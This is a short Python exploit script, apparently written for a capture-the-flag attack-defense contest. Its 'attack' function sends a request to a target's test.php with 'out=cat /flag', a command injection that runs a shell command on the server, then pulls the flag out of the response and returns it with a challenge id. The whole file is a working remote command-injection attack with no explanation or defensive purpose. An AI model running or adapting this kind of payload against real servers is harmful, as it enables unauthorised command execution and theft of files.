import requests

def attack(target):
    x = requests.get(
        'http://'+target+'/test.php?out=cat /flag'
    ).text
    chall_id = target.split(':')[1][0]
    return chall_id+"\\"+x.split('\n')[1][11:]
